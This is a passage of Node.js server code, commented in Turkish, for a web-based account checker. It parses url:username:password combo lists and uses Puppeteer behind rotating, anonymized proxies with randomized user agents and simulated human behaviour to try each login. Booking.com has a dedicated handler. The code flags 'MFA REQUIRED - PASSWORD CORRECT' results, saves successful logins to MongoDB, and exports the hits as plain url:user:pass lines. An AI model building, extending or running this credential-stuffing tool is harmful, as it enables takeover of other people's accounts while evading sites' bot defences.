            const hasMyBookings = !!document.querySelector('a[href*="bookings"], a[href*="reservations"]');
            
            return {
                errorMessages: [...errorMessages, ...hiddenErrors].filter(Boolean),
                bodyText: bodyText.toLowerCase(),
                title: title.toLowerCase(),
                hasLoginForm: hasLoginForm,
                hasDashboard: hasDashboard || hasMyBookings,
                currentUrl: window.location.href
            };
        });
        
        // Benzersiz hata mesajlarını al
        const uniqueErrors = [...new Set(bookingCheck.errorMessages)];
        const errorMessage = uniqueErrors.join(' | ');
        
        // Başarılı giriş
        if (bookingCheck.hasDashboard) {
            return { success: true, reason: 'Booking dashboard tespit edildi', errorMessage: null };
        }
        
        // Hata kontrolü
        if (uniqueErrors.length > 0) {
            // Özel hata mesajlarını kontrol et
            const errorLower = errorMessage.toLowerCase();
            
            // "Invalid credentials" tipi hatalar
            if (errorLower.includes('invalid') || 
                errorLower.includes('wrong') || 
                errorLower.includes('incorrect') ||
                errorLower.includes('not found') ||
                errorLower.includes('no account') ||
                errorLower.includes('password') && errorLower.includes('incorrect')) {
                return { 
                    success: false, 
                    reason: `Hata: ${errorMessage}`,
                    errorMessage: errorMessage
                };
            }
            
            // Diğer hatalar
            return { 
                success: false, 
                reason: `Hata: ${errorMessage}`,
                errorMessage: errorMessage
            };
        }
        
        // MFA kontrolü
        if (bookingCheck.bodyText.includes('verification') || 
            bookingCheck.bodyText.includes('2fa') || 
            bookingCheck.bodyText.includes('authenticator') ||
            bookingCheck.bodyText.includes('doğrulama') ||
            bookingCheck.bodyText.includes('verification code')) {
            return { 
                success: null, 
                mfaRequired: true, 
                reason: 'MFA/2FA gerekiyor',
                errorMessage: '2FA/Verification Required'
            };
        }
        
        // URL değişti ve login formu yok
        if (urlChanged && !bookingCheck.hasLoginForm) {
            return { 
                success: true, 
                reason: 'URL değişti ve login formu kayboldu',
                errorMessage: null
            };
        }
        
        // Booking özel: "Sign in" sayfasından çıktıysa
        if (urlChanged && !currentUrl.includes('/sign-in')) {
            return { 
                success: true, 
                reason: 'Booking sign-in sayfasından çıkıldı',
                errorMessage: null
            };
        }
        
        // Hala login formu varsa ve hata yoksa
        if (bookingCheck.hasLoginForm) {
            return { 
                success: false, 
                reason: 'Login formu hala görünür - giriş başarısız',
                errorMessage: 'Login form still visible'
            };
        }
    }
    
    // ========== GENEL KONTROL (MEVCUT) ==========
    // ... mevcut kod devam eder ...
    
    return { success: false, reason: 'Başarılı giriş doğrulanamadı', errorMessage: null };
}


// ==================== PARSER FONKSİYONLARI ====================
function parseCredentialLine(line) {
    line = line.trim();
    if (!line || line.startsWith('###')) return null;

    let url = null, username = null, password = null;

    const lastColon = line.lastIndexOf(':');
    const credentialSearchStart = line.includes('://') ? line.indexOf('://') + 3 : 0;
    const secondLastColon = lastColon > -1 ? line.lastIndexOf(':', lastColon - 1) : -1;
    const hasTwoCredentialSeparators = secondLastColon >= credentialSearchStart;
    
    if (line.includes('://') || (secondLastColon !== -1 && /^[\w.-]+\.[a-z]{2,}(?:[/?#].*)?$/i.test(line.substring(0, secondLastColon)))) {
        if (!hasTwoCredentialSeparators) return null;
        url = line.substring(0, secondLastColon);
        username = line.substring(secondLastColon + 1, lastColon);
        password = line.substring(lastColon + 1);
    } else {
        const colonIndex = line.indexOf(':');
        if (colonIndex !== -1) {
            username = line.substring(0, colonIndex);
            password = line.substring(colonIndex + 1);
        } else {
            username = line;
            password = '';
        }
    }
    if (!username || username.trim() === '') return null;
    return { url, username, password };
}

function normalizeFieldLabel(value) {
    return String(value || '')
        .toLocaleLowerCase('tr-TR')
        .replace(/[ş]/g, 's')
        .replace(/[ıiİ]/g, 'i')
        .replace(/[ğ]/g, 'g')
        .replace(/[ü]/g, 'u')
        .replace(/[ö]/g, 'o')
        .replace(/[ç]/g, 'c')
        .replace(/[^\p{L}\p{N}]+/gu, '');
}

function extractLabeledValue(line, labels) {
    const normalized = String(line || '').trim();
    const colonIndex = normalized.indexOf(':');
    if (colonIndex === -1) return '';

    const label = normalizeFieldLabel(normalized.slice(0, colonIndex));
    if (!labels.includes(label)) return '';

    return normalized.slice(colonIndex + 1).trim();
}

function parseCredentialText(credsText) {
    const lines = String(credsText || '').split(/\r?\n/);
    const parsed = [];
    let block = {};

    const flushBlock = () => {
        if (block.url || block.username || block.password) {
            if (block.url && block.username) {
                parsed.push({
                    url: block.url,
                    username: block.username,
                    password: block.password || ''
                });
            }
            block = {};
        }
    };

    for (const rawLine of lines) {
        const line = rawLine.trim();
        if (!line || line.startsWith('###')) {
            if (!line) flushBlock();
            continue;
        }

        const password = extractLabeledValue(line, ['sifre', 'password', 'parola']);
        const username = extractLabeledValue(line, ['nick', 'kullanici', 'username', 'user', 'eposta', 'email', 'mail']);
        const url = extractLabeledValue(line, ['baglanti', 'url', 'link']);

        if (password) {
            if (block.password && (block.url || block.username)) flushBlock();
            block.password = password;
            continue;
        }
        if (username) {
            block.username = username;
            continue;
        }
        if (url) {
            block.url = url;
            if (block.username) flushBlock();
            continue;
        }

        flushBlock();
        const singleLine = parseCredentialLine(line);
        if (singleLine && singleLine.url && singleLine.username) parsed.push(singleLine);
    }

    flushBlock();
    return parsed;
}

// ==================== MONGODB FONKSİYONLARI ====================
function buildStoredResult(result, owner) {
    return {
        ownerUserId: owner.id,
        ownerUsername: owner.username,
        ownerRole: owner.role,
        url: result.baseUrl,
        domain: getDomainFromUrl(result.baseUrl),
        username: result.username,
        passwordMasked: maskPassword(result.password),
        passwordLength: String(result.password || '').length,
        status: result.status || (result.success ? 'success' : 'fail'),
        success: result.success === true,
        message: result.message || '',
        checkedAt: result.timestamp ? new Date(result.timestamp) : new Date(),
        createdAt: new Date()
    };
}

async function saveCheckResult(result, owner) {
    if (!db) return;
    try {
        await db.collection('check_results').insertOne(buildStoredResult(result, owner));
    } catch (err) {
        console.error('Check sonucu kayıt hatası:', err);
        sendLog(`❌ Check sonucu kayıt hatası: ${err.message}`, 'error', owner.id);
    }
}

async function saveSuccessfulLogin(result, owner) {
    if (!db) return;
    try {
        await db.collection('successful_logins').insertOne(buildStoredResult(result, owner));
        sendLog(`💾 Başarılı giriş MongoDB'ye kaydedildi: ${result.username} @ ${result.baseUrl}`, 'success', owner.id);
    } catch (err) {
        console.error('MongoDB kayıt hatası:', err);
        sendLog(`❌ MongoDB kayıt hatası: ${err.message}`, 'error', owner.id);
    }
}

function getRequestIp(req) {
    return String(req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
        .split(',')[0]
        .trim();
}

async function saveSessionLog(req, event, details = {}) {
    if (!db) return;
    try {
        await db.collection('session_logs').insertOne({
            event,
            userId: details.userId || null,
            username: normalizeUsername(details.username),
            role: details.role || null,
            success: event === 'login_success' || event === 'logout',
            reason: details.reason || '',
            ip: getRequestIp(req),
            userAgent: String(req.headers['user-agent'] || ''),
            createdAt: new Date()
        });
    } catch (err) {
        console.error('Session log kayıt hatası:', err.message);
    }
}

async function saveUserAuditLog(req, action, target, changes = {}) {
    if (!db) return;
    await db.collection('user_audit_logs').insertOne({
        action,
        actorUserId: req.user.id,
        actorUsername: req.user.username,
        targetUserId: target ? String(target._id || target.id || '') : null,
        targetUsername: target ? target.username : null,
        changes,
        ip: getRequestIp(req),
        createdAt: new Date()
    });
}

async function connectMongo() {
    try {
        const uri = process.env.MONGODB_CONNECTIONSTRING || process.env.DATABASE_URL;
        mongoStatus = {
            configured: Boolean(uri),
            attempted: Boolean(uri),
            connected: false,
            error: null
        };
        if (!uri) {
            console.log('⚠ MongoDB connection string bulunamadı.');
            mongoStatus.error = 'MongoDB connection string missing';
            return;
        }

        console.log('MongoDB bağlantısı başlatılıyor...');
        let options = {};

        if (uri.includes('MONGODB-X509')) {
            console.log('🔐 X509 authentication modu aktif...');
            const certPath = process.env.MONGODB_CERT_PATH;
            if (certPath && (await fs.access(certPath).then(() => true).catch(() => false))) {
                options = { tlsCertificateKeyFile: certPath, tlsAllowInvalidCertificates: false };
                console.log(`🔐 X509 sertifika dosyası kullanılıyor: ${certPath}`);
            }
        } else if (process.env.MONGODB_USERNAME && process.env.MONGODB_PASSWORD) {
            options = {
                auth: { username: process.env.MONGODB_USERNAME, password: process.env.MONGODB_PASSWORD }
            };
        }

        const client = new MongoClient(uri, { ...options, serverSelectionTimeoutMS: 15000 });
        await client.connect();
        db = client.db();
        mongoStatus.connected = true;
        
        const users = db.collection('users');
        await users.createIndex({ username: 1 }, { unique: true });
        await db.collection('check_results').createIndex({ ownerUserId: 1, createdAt: -1 });
        await db.collection('successful_logins').createIndex({ ownerUserId: 1, createdAt: -1 });
        await db.collection('session_logs').createIndex({ createdAt: -1 });
        await db.collection('session_logs').createIndex({ username: 1, createdAt: -1 });
        await db.collection('user_audit_logs').createIndex({ createdAt: -1 });
        await db.collection('settings').createIndex({ _id: 1 });
        
        console.log('✅ MongoDB bağlantısı başarılı');
        return client;
    } catch (err) {
        console.error('❌ MongoDB bağlantı hatası:', err.message);
        db = null;
        mongoStatus.connected = false;
        mongoStatus.error = err.message;
        return null;
    }
}

// ==================== LOG + SSE ====================
function canReceiveLog(client, ownerUserId) {
    if (!ownerUserId) return true;
    return client.user.role === 'admin' || client.user.id === ownerUserId;
}

function sendLog(msg, type = 'info', ownerUserId = null) {
    const logEntry = { timestamp: new Date().toISOString(), message: msg, type, ownerUserId };
    clients = clients.filter(c => !c.res.destroyed);
    clients.filter(c => canReceiveLog(c, ownerUserId)).forEach(c => c.res.write(`data: ${JSON.stringify(logEntry)}\n\n`));
    console.log(msg);
}

// ==================== PROXY POOL BAŞLATMA ====================
async function initializeProxyPool() {
    if (db) {
        await proxyPool.loadFromDB(db);
    }
    
    if (proxyPool.proxies.length === 0) {
        const defaultProxies = defaultProxyConfig.proxies || [];
        defaultProxies.forEach(p => proxyPool.addProxy(p));
        if (db) await proxyPool.saveToDB(db);
        console.log(`📦 ${proxyPool.proxies.length} varsayılan proxy eklendi`);
    }
}

// ==================== ANA TEST FONKSİYONU ====================
async function runAllTests(testItems, owner, runId) {
    const testState = {
        stopRequested: false,
        results: [],
        browser: null,
        anonymizedProxyUrl: null
    };
    activeTests.set(runId, testState);

    const resultsFile = getResultsFile(owner.id, runId);
    const results = testItems.map(item => ({
        baseUrl: item.baseUrl,
        username: item.username,
        password: item.password,
        status: 'queued',
        success: null,
        message: 'SIRADA',
        timestamp: new Date().toISOString(),
        urlAfterLogin: null,
        titleAfterLogin: null,
        details: null
    }));
    testState.results = results;
    await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));

    const total = testItems.length;
    sendLog(`🚀 BAŞLANGIÇ – ${total} test`, 'info', owner.id);
    
    // ========== PROXY SEÇ ==========
    let selectedProxy = null;
    
    const userProxyUrl = await getProxyUrlForUser(owner.id);
    if (userProxyUrl) {
        selectedProxy = { url: userProxyUrl, label: 'Kullanıcı Proxy' };
        sendLog(`🌍 Kullanıcı proxy aktif`, 'info', owner.id);
    } else {
        const proxy = proxyPool.getNextProxy();
        if (proxy && proxy.enabled) {
            selectedProxy = proxy;
            const location = proxy.location || 'unknown';
            const locationLabel = proxyPool.locations[location]?.label || location;
            sendLog(`🌍 Proxy seçildi: ${locationLabel} (${proxy.label})`, 'info', owner.id);
        } else {
            sendLog(`🌍 Proxy yok, direkt bağlantı`, 'info', owner.id);
        }
    }

    let browser = null;
    let anonymizedProxyUrl = null;
    
    try {
        if (selectedProxy && selectedProxy.url) {
            try {
                anonymizedProxyUrl = await ProxyChain.anonymizeProxy(selectedProxy.url);
                testState.anonymizedProxyUrl = anonymizedProxyUrl;
                sendLog(`🔐 Proxy anonimleştirildi`, 'success', owner.id);
            } catch (error) {
                sendLog(`❌ Proxy anonimleştirme başarısız: ${error.message}`, 'error', owner.id);
            }
        }
        
        const launchOptions = getBrowserLaunchOptions(runId, anonymizedProxyUrl || '');
        launchOptions.userAgent = proxyPool.getUserAgent();
        browser = await puppeteer.launch(launchOptions);
        testState.browser = browser;
        sendLog('✅ Browser motoru hazır', 'success', owner.id);
        await runBrowserSmokeTest(browser);
        sendLog('✅ Smoke test geçti', 'success', owner.id);
        
    } catch (err) {
        const message = `BROWSER_START_FAILED: ${err.message}`;
        sendLog(`❌ ${message}`, 'error', owner.id);
        for (const result of results) {
            result.status = 'error';
            result.message = message;
            result.timestamp = new Date().toISOString();
            await saveCheckResult(result, owner);
        }
        await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));
        if (browser) await browser.close().catch(() => {});
        if (anonymizedProxyUrl) await ProxyChain.closeAnonymizedProxy(anonymizedProxyUrl, true).catch(() => {});
        activeTests.delete(runId);
        return results;
    }

    // ========== TEST DÖNGÜSÜ ==========
    for (let i = 0; i < total; i++) {
        if (testState.stopRequested) {
            sendLog(`⏹ Test durduruldu (${i}/${total} tamamlandı)`, 'info', owner.id);
            for (let j = i; j < total; j++) {
                results[j].status = 'cancelled';
                results[j].success = null;
                results[j].message = 'TEST CANCELLED';
                results[j].timestamp = new Date().toISOString();
                await saveCheckResult(results[j], owner);
            }
            await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));
            break;
        }

        const { baseUrl, username, password } = testItems[i];
        sendLog(`📌 Test ${i+1}/${total}: ${username} @ ${baseUrl}`, 'info', owner.id);

        const result = results[i];
        result.status = 'running';
        result.message = 'ÇALIŞIYOR';
        result.timestamp = new Date().toISOString();
        await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));
        await delay(CHECK_PROGRESS_DELAY_MS);

        let context = null;
        let page = null;
        let originalUrl = '';
        
        try {
            try {
                context = await browser.createIncognitoBrowserContext();
                sendLog(`🔒 Incognito context oluşturuldu`, 'info', owner.id);
            } catch (incognitoError) {
                console.warn('Incognito desteklenmiyor, default context kullanılıyor:', incognitoError.message);
                context = browser.defaultBrowserContext();
                sendLog(`🔓 Default context kullanılıyor`, 'info', owner.id);
            }
            
            if (testState.stopRequested) {
                throw new Error('TEST_STOPPED');
            }
            
            page = await context.newPage();
            page.setDefaultNavigationTimeout(CHECK_NAVIGATION_TIMEOUT_MS);
            
            await proxyPool.clearCookies(page);
            sendLog(`🍪 Cookie\'ler temizlendi`, 'info', owner.id);
            
            const userAgent = proxyPool.getUserAgent();
            await page.setUserAgent(userAgent);
            sendLog(`🔄 User-Agent: ${userAgent.slice(0, 50)}...`, 'info', owner.id);
            
            const url = normalizeUrl(baseUrl);
            if (!(await isAllowedCheckUrl(url))) {
                throw new Error(`CHECK_BLOCKED_HOST: ${new URL(url).hostname} izinli değil`);
            }
            
            await proxyPool.randomDelay(300, 1000);
            await page.goto(url, { 
                waitUntil: 'domcontentloaded', 
                timeout: CHECK_NAVIGATION_TIMEOUT_MS 
            });
            originalUrl = page.url();
            sendLog(`📍 Sayfa yüklendi: ${originalUrl}`, 'info', owner.id);
            
            await proxyPool.simulateHumanBehavior(page);
            await proxyPool.randomDelay(500, 1500);

            // ========== FORM BUL ==========
            const handler = new UniversalFormHandler(page);
            let formInfo = null;
            
            // Booking.com için özel işlem
            if (baseUrl.includes('booking.com')) {
                try {
                    formInfo = await handler.findBookingLoginForm();
                    if (formInfo) {
                        sendLog(`🔍 Booking.com özel form bulundu`, 'info', owner.id);
                        await handler.fillBookingForm(formInfo, username, password);
                    } else {
                        // Standart form handler'ı dene
                        formInfo = await handler.findLoginForm();
                        if (formInfo) {
                            await handler.fillAndSubmit(formInfo, username, password);
                        }
                    }
                } catch (err) {
                    sendLog(`⚠ Booking form hatası: ${err.message}`, 'error', owner.id);
                    throw err;
                }
            } else {
                // Diğer siteler için normal handler
                formInfo = await handler.findLoginForm();
                if (formInfo) {
                    sendLog(`🔍 Form tipi: ${formInfo.type}`, 'info', owner.id);
                    await handler.fillAndSubmit(formInfo, username, password);
                }
            }
            
            if (!formInfo) {
                throw new Error('Login formu bulunamadı');
            }
            
            await proxyPool.randomDelay(300, 800);
            await delay(CHECK_POST_SUBMIT_WAIT_MS);
            await proxyPool.randomDelay(500, 1500);
            
            // ========== SONUÇ KONTROL ==========
            const verification = await verifyLoginSuccess(page, originalUrl);
            
            result.urlAfterLogin = verification.url || page.url();
            result.titleAfterLogin = verification.title || '';
            result.details = verification.reason || '';
            
            if (verification.mfaRequired) {
                result.success = null;
                result.status = 'mfa_required';
                result.message = 'MFA REQUIRED - PASSWORD CORRECT';
                sendLog(`🛡 2FA GEREKLİ: ${username}`, 'info', owner.id);
            } else if (verification.success) {
                result.success = true;
                result.status = 'success';
                result.message = 'LOGIN OK - ' + verification.reason;
                sendLog(`✅ BAŞARILI: ${username}`, 'success', owner.id);
                await saveSuccessfulLogin(result, owner);
            } else {
                result.success = false;
                result.status = 'fail';
                result.message = 'LOGIN FAIL - ' + verification.reason;
                sendLog(`❌ BAŞARISIZ: ${username} - ${verification.reason}`, 'fail', owner.id);
            }
            
            await saveCheckResult(result, owner);
            
        } catch (err) {
            const errorMsg = err.message || 'Bilinmeyen hata';
            
            if (errorMsg === 'TEST_STOPPED') {
                result.status = 'cancelled';
                result.success = null;
                result.message = 'TEST CANCELLED';
                sendLog(`⏹ Test iptal edildi: ${username}`, 'info', owner.id);
            } else {
                result.status = errorMsg.startsWith('CHECK_BLOCKED_HOST') ? 'blocked' : 'error';
                result.success = null;
                result.message = errorMsg;
                result.details = errorMsg;
                sendLog(`⚠ HATA ${username}: ${errorMsg}`, 'error', owner.id);
            }
            await saveCheckResult(result, owner);
            
        } finally {
            try {
                if (page && !page.isClosed()) {
                    await page.close();
                }
            } catch (closeError) {
                console.warn('Sayfa kapatma hatası:', closeError.message);
            }
            
            try {
                if (context && context !== browser.defaultBrowserContext()) {
                    await context.close();
                }
            } catch (closeError) {
                console.warn('Context kapatma hatası:', closeError.message);
            }
            
            sendLog(`🧹 Session kapatıldı: ${username}`, 'info', owner.id);
        }

        await fs.writeFile(resultsFile, JSON.stringify(results, null, 2));
        
        if (i < total - 1 && !testState.stopRequested) {
            sendLog(`⏱ ${CHECK_ATTEMPT_DELAY_MS / 1000} saniye bekleniyor...`, 'info', owner.id);
            await delay(CHECK_ATTEMPT_DELAY_MS);
        }
    }

    if (browser) {
        await browser.close().catch(() => {});
    }
    if (anonymizedProxyUrl) {
        await ProxyChain.closeAnonymizedProxy(anonymizedProxyUrl, true).catch(() => {});
        sendLog(`🔐 Anonim proxy kapatıldı`, 'info', owner.id);
    }
    
    activeTests.delete(runId);
    
    const okCount = results.filter(x => x.status === 'success').length;
    const failCount = results.filter(x => x.status === 'fail').length;
    const mfaCount = results.filter(x => x.status === 'mfa_required').length;
    const cancelledCount = results.filter(x => x.status === 'cancelled').length;
    const errorCount = results.filter(x => x.status === 'error' || x.status === 'blocked').length;
    
    sendLog(`🏁 BİTİŞ – ✅:${okCount} ❌:${failCount} 🛡:${mfaCount} ⏹:${cancelledCount} ⚠:${errorCount}`, 'info', owner.id);
    return results;
}

// ==================== API ENDPOINTLER ====================

// Auth
app.post('/api/auth/login', async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        const username = normalizeUsername(req.body?.username);
        const password = String(req.body?.password || '');
        if (!username || !password) {
            await saveSessionLog(req, 'login_failed', { username, reason: 'missing_credentials' });
            return res.status(400).json({ error: 'Kullanıcı adı ve şifre gerekli.' });
        }

        const user = await db.collection('users').findOne({ username });
        if (!user || user.active === false || !verifyPassword(password, user.passwordHash)) {
            await saveSessionLog(req, 'login_failed', { username, reason: 'invalid_credentials' });
            return res.status(401).json({ error: 'Kullanıcı adı veya şifre hatalı.' });
        }

        await db.collection('users').updateOne(
            { _id: user._id },
            { $set: { lastLoginAt: new Date() } }
        );
        const cookie = createSessionCookie(user);
        const secure = IS_PRODUCTION ? '; Secure' : '';
        res.setHeader('Set-Cookie', `${SESSION_COOKIE}=${encodeURIComponent(cookie)}; HttpOnly; SameSite=Lax; Path=/; Max-Age=604800${secure}`);
        await saveSessionLog(req, 'login_success', {
            userId: String(user._id),
            username: user.username,
            role: user.role
        });
        res.json({ user: publicUser({ ...user, lastLoginAt: new Date() }) });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/auth/logout', async (req, res) => {
    const user = getSessionUser(req);
    if (user) {
        await saveSessionLog(req, 'logout', { userId: user.id, username: user.username, role: user.role });
    }
    res.setHeader('Set-Cookie', `${SESSION_COOKIE}=; HttpOnly; SameSite=Lax; Path=/; Max-Age=0`);
    res.json({ ok: true });
});

app.get('/api/auth/me', requireAuth, (req, res) => {
    res.json({ user: req.user });
});

// ==================== STOP API ====================
app.post('/api/stop', requireAuth, requirePermission(PERMISSIONS.CHECKER_RUN), async (req, res) => {
    try {
        const runId = req.query.runId;
        if (!runId) {
            return res.status(400).json({ error: 'Run ID gerekli' });
        }
        
        const testState = activeTests.get(runId);
        if (!testState) {
            return res.status(404).json({ error: 'Aktif test bulunamadı' });
        }
        
        testState.stopRequested = true;
        
        if (testState.browser) {
            try {
                await testState.browser.close();
                sendLog(`🔚 Browser zorla kapatıldı`, 'info', req.user.id);
            } catch (err) {
                console.warn('Browser kapatma hatası:', err.message);
            }
        }
        
        if (testState.anonymizedProxyUrl) {
            try {
                await ProxyChain.closeAnonymizedProxy(testState.anonymizedProxyUrl, true).catch(() => {});
            } catch (err) {
                console.warn('Proxy kapatma hatası:', err.message);
            }
        }
        
        sendLog(`⏹ Test durduruldu: ${runId}`, 'info', req.user.id);
        res.json({ success: true, message: 'Test durduruldu' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== CHECKER API ====================
app.post('/api/start', requireAuth, requirePermission(PERMISSIONS.CHECKER_RUN), async (req, res) => {
    try {
        let { credsText } = req.body;
        credsText = credsText || '';

        const parsedCreds = parseCredentialText(credsText);
        const testItems = parsedCreds.map(cred => ({
            baseUrl: cred.url,
            username: cred.username,
            password: cred.password || ''
        }));

        if (testItems.length === 0) {
            return res.status(400).json({ error: 'Geçerli test verisi yok.' });
        }

        const hosts = await getAllowedHosts();
        const blockedHosts = [...new Set(testItems
            .filter(item => !isAllowedCheckUrl(item.baseUrl))
            .map(item => {
                try { return new URL(normalizeUrl(item.baseUrl)).hostname.toLowerCase(); } 
                catch { return item.baseUrl; }
            }))];

        if (blockedHosts.length > 0) {
            return res.status(400).json({
                error: `İzinli olmayan host: ${blockedHosts.join(', ')}`,
                allowedHosts: hosts
            });
        }

        const runId = crypto.randomUUID();
        res.json({ message: 'Test başladı', total: testItems.length, runId });
        runAllTests(testItems, req.user, runId).catch(err => {
            console.error('Test runner fatal error:', err);
            sendLog(`❌ Test çalıştırıcı durdu: ${err.message}`, 'error', req.user.id);
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/results', requireAuth, requirePermission(PERMISSIONS.CHECKER_RESULTS), async (req, res) => {
    try {
        const runId = req.query.runId;
        if (!runId) return res.json([]);
        const data = await fs.readFile(getResultsFile(req.user.id, runId), 'utf8');
        res.json(JSON.parse(data));
    } catch {
        res.json([]);
    }
});

app.delete('/api/results', requireAuth, requirePermission(PERMISSIONS.CHECKER_RESULTS), async (req, res) => {
    try {
        const runId = req.query.runId;
        if (runId) await fs.writeFile(getResultsFile(req.user.id, runId), '[]');
        res.json({ ok: true });
    } catch { res.status(500).json({ error: 'Silme hatası' }); }
});

app.get('/api/download', requireAuth, requirePermission(PERMISSIONS.CHECKER_RESULTS), async (req, res) => {
    try {
        const runId = req.query.runId;
        if (!runId) return res.status(400).send('Run ID yok');
        const data = JSON.parse(await fs.readFile(getResultsFile(req.user.id, runId), 'utf8'));
        const success = data.filter(x => x.status === 'success' || x.success === true);
        const fail = data.filter(x => x.status === 'fail' || x.success === false);
        const error = data.filter(x => x.status === 'error' || x.status === 'blocked');
        let output = '✅ BAŞARILI\n\n';
        success.forEach(x => output += `${x.baseUrl}:${x.username}:${x.password}\n`);
        output += '\n❌ BAŞARISIZ\n\n';
        fail.forEach(x => output += `${x.baseUrl}:${x.username}:${x.password}\n`);
        output += '\n⚠ ÇALIŞTIRILAMADI\n\n';
        error.forEach(x => output += `${x.baseUrl}:${x.username}:${x.password} # ${x.message || x.status}\n`);
        res.setHeader('Content-Disposition', 'attachment; filename=result.txt');
        res.send(output);
    } catch {
        res.status(500).send('Sonuç dosyası yok');
    }
});

// ==================== HISTORY API ====================
app.get('/api/history/checks', requireAuth, requirePermission(PERMISSIONS.HISTORY_OWN), async (req, res) => {
    try {
        if (!db) return res.json([]);
        const query = {};
        if (!req.user.permissions.includes(PERMISSIONS.HISTORY_ALL)) query.ownerUserId = req.user.id;
        const data = await db.collection('check_results').find(query, { projection: { passwordLength: 0 } })
            .sort({ createdAt: -1 }).limit(500).toArray();
        res.json(data);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/history/successful', requireAuth, requirePermission(PERMISSIONS.HISTORY_OWN), async (req, res) => {
    try {
        if (!db) return res.json([]);
        const query = {};
        if (!req.user.permissions.includes(PERMISSIONS.HISTORY_ALL)) query.ownerUserId = req.user.id;
        const data = await db.collection('successful_logins').find(query, { projection: { passwordLength: 0 } })
            .sort({ createdAt: -1 }).limit(500).toArray();
        res.json(data);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ==================== ADMIN API ====================
app.get('/api/admin/users', requireAuth, requirePermission(PERMISSIONS.USERS_MANAGE), async (req, res) => {
    try {
        if (!db) return res.json([]);
        const users = await db.collection('users').find({}, { projection: { passwordHash: 0 } }).sort({ username: 1 }).toArray();
        res.json({ 
            users: users.map(publicUser), 
            permissionCatalog: PERMISSION_CATALOG, 
            defaults: { admin: ALL_PERMISSIONS, user: DEFAULT_USER_PERMISSIONS } 
        });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/admin/users', requireAuth, requirePermission(PERMISSIONS.USERS_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        const usernameValidation = validateUsername(req.body?.username);
        if (!usernameValidation.ok) return res.status(400).json({ error: usernameValidation.error });
        const passwordValidation = validatePassword(req.body?.password);
        if (!passwordValidation.ok) return res.status(400).json({ error: passwordValidation.error });

        const role = normalizeRole(req.body?.role);
        const permissions = role === 'admin' ? [...ALL_PERMISSIONS] : [...DEFAULT_USER_PERMISSIONS];
        const now = new Date();
        const result = await db.collection('users').insertOne({
            username: usernameValidation.username,
            passwordHash: hashPassword(passwordValidation.password),
            role, permissions,
            active: req.body?.active !== false,
            createdAt: now, updatedAt: now, createdBy: req.user.username
        });
        const user = await db.collection('users').findOne({ _id: result.insertedId });
        await saveUserAuditLog(req, 'user_created', user);
        res.status(201).json({ user: publicUser(user) });
    } catch (err) {
        if (err?.code === 11000) return res.status(409).json({ error: 'Bu kullanıcı adı zaten kayıtlı.' });
        res.status(500).json({ error: err.message });
    }
});

app.patch('/api/admin/users/:id', requireAuth, requirePermission(PERMISSIONS.USERS_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        if (!ObjectId.isValid(req.params.id)) return res.status(400).json({ error: 'Geçersiz id.' });
        const target = await db.collection('users').findOne({ _id: new ObjectId(req.params.id) });
        if (!target) return res.status(404).json({ error: 'Kullanıcı bulunamadı.' });

        const nextRole = req.body?.role === undefined ? normalizeRole(target.role) : normalizeRole(req.body.role);
        const nextActive = req.body?.active === undefined ? target.active !== false : Boolean(req.body.active);
        if (String(target._id) === req.user.id && (nextRole !== 'admin' || !nextActive)) {
            return res.status(400).json({ error: 'Kendi admin hesabınızı değiştiremezsiniz.' });
        }

        const update = {
            role: nextRole, active: nextActive,
            permissions: nextRole === 'admin' ? [...ALL_PERMISSIONS] : [...DEFAULT_USER_PERMISSIONS],
            updatedAt: new Date(), updatedBy: req.user.username
        };
        const passwordValidation = validatePassword(req.body?.password, false);
        if (passwordValidation.ok && passwordValidation.password) {
            update.passwordHash = hashPassword(passwordValidation.password);
        }

        await db.collection('users').updateOne({ _id: target._id }, { $set: update });
        const updated = await db.collection('users').findOne({ _id: target._id });
        await saveUserAuditLog(req, 'user_updated', updated);
        res.json({ user: publicUser(updated) });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/admin/users/:id', requireAuth, requirePermission(PERMISSIONS.USERS_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        if (!ObjectId.isValid(req.params.id)) return res.status(400).json({ error: 'Geçersiz id.' });
        if (req.params.id === req.user.id) return res.status(400).json({ error: 'Kendi hesabınızı silemezsiniz.' });
        const target = await db.collection('users').findOne({ _id: new ObjectId(req.params.id) });
        if (!target) return res.status(404).json({ error: 'Kullanıcı bulunamadı.' });
        await db.collection('users').deleteOne({ _id: target._id });
        await saveUserAuditLog(req, 'user_deleted', target);
        res.json({ ok: true });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/admin/session-logs', requireAuth, requirePermission(PERMISSIONS.SESSIONS_VIEW), async (req, res) => {
    try {
        if (!db) return res.json([]);
        const logs = await db.collection('session_logs').find({}).sort({ createdAt: -1 }).limit(500).toArray();
        res.json(logs);
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// ==================== ALLOWED HOSTS API ====================
app.get('/api/admin/allowed-hosts', requireAuth, requirePermission(PERMISSIONS.HOSTS_MANAGE), async (req, res) => {
    try {
        const settings = await getSettings();
        res.json({
            hosts: settings?.allowedHosts || [],
            envHosts: [],
            dynamicHosts: settings?.allowedHosts || [],
            rootDomains: settings?.rootDomains || [],
            rootDomainEnforced: settings?.enforceRootDomains || false,
            persistence: db ? 'mongodb' : 'memory'
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/admin/allowed-hosts', requireAuth, requirePermission(PERMISSIONS.HOSTS_MANAGE), async (req, res) => {
    try {
        if (!db) return res.status(503).json({ error: 'DB bağlantısı yok' });
        
